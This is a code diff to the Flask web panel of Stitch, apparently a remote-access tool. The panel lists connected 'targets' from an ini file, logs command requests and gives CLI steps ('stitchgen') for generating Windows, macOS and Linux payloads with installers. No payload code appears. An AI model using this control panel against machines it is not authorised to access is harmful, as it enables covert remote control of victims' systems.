@@ -29,6 +29,7 @@ USERS = {DEFAULT_USERNAME: generate_password_hash(DEFAULT_PASSWORD)}
 active_connections = {}
 command_history = []
 debug_logs = []
+stitch_server_instance = None
 
 def login_required(f):
     @wraps(f)
@@ -83,16 +84,28 @@ def logout():
 @login_required
 def get_connections():
     connections = []
-    for conn_id, conn_data in active_connections.items():
-        connections.append({
-            'id': conn_id,
-            'target': conn_data.get('target'),
-            'port': conn_data.get('port'),
-            'os': conn_data.get('os'),
-            'hostname': conn_data.get('hostname'),
-            'user': conn_data.get('user'),
-            'connected_at': conn_data.get('connected_at')
-        })
+    try:
+        import configparser
+        config = configparser.ConfigParser()
+        config.read(hist_ini)
+        
+        for target in config.sections():
+            try:
+                conn_data = {
+                    'id': target,
+                    'target': target,
+                    'port': config.get(target, 'port') if config.has_option(target, 'port') else '4040',
+                    'os': config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown',
+                    'hostname': config.get(target, 'hostname') if config.has_option(target, 'hostname') else target,
+                    'user': config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown',
+                    'connected_at': datetime.now().isoformat()
+                }
+                connections.append(conn_data)
+            except Exception as e:
+                log_debug(f"Error reading connection {target}: {str(e)}", "WARNING")
+    except Exception as e:
+        log_debug(f"Error loading connections: {str(e)}", "ERROR")
+    
     return jsonify(connections)
 
 @app.route('/api/execute', methods=['POST'])
@@ -106,10 +119,7 @@ def execute_command():
         if not conn_id or not command:
             return jsonify({'success': False, 'error': 'Missing connection_id or command'}), 400
         
-        if conn_id not in active_connections:
-            return jsonify({'success': False, 'error': 'Connection not found'}), 404
-        
-        log_debug(f"Executing command: {command} on connection {conn_id}")
+        log_debug(f"Command requested: {command} for {conn_id}")
         
         command_history.append({
             'timestamp': datetime.now().isoformat(),
@@ -120,12 +130,12 @@ def execute_command():
         
         return jsonify({
             'success': True,
-            'message': 'Command queued for execution',
-            'output': f'Executed: {command}'
+            'message': 'Note: Direct command execution requires the CLI interface. Please use the terminal workflow or connect via SSH to execute commands on live connections.',
+            'output': f'Command logged: {command}\n\nTo execute commands:\n1. Use the CLI workflow in the terminal tab\n2. Type "connect {conn_id}" to select the connection\n3. Execute your commands directly\n\nThe CLI provides full command execution capabilities.'
         })
         
     except Exception as e:
-        log_debug(f"Error executing command: {str(e)}", "ERROR")
+        log_debug(f"Error processing command: {str(e)}", "ERROR")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/payload/generate', methods=['POST'])
@@ -137,19 +147,16 @@ def generate_payload():
         host = data.get('host', '0.0.0.0')
         port = data.get('port', 4040)
         
-        log_debug(f"Generating payload: OS={os_type}, Host={host}, Port={port}")
-        
-        payload_name = f"stitch_{os_type}_{int(time.time())}"
+        log_debug(f"Payload generation requested: OS={os_type}, Host={host}, Port={port}")
         
         return jsonify({
             'success': True,
-            'payload_name': payload_name,
-            'message': f'Payload {payload_name} generated successfully',
-            'download_url': f'/api/payload/download/{payload_name}'
+            'message': f'To generate {os_type} payloads:\n\n1. Open the Terminal tab\n2. Run: python3 main.py\n3. At the Stitch prompt, type: stitchgen\n4. Follow the prompts to configure your payload\n5. Generated payloads will appear in the Payloads/ folder\n6. Use the Files tab to download them\n\nPayload options:\n- Host: {host}\n- Port: {port}\n- OS: {os_type}\n\nStitch supports Windows, macOS, and Linux payloads with installers!',
+            'note': 'Payload generation is available via CLI for full customization'
         })
         
     except Exception as e:
-        log_debug(f"Error generating payload: {str(e)}", "ERROR")
+        log_debug(f"Error in payload request: {str(e)}", "ERROR")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/debug/logs')
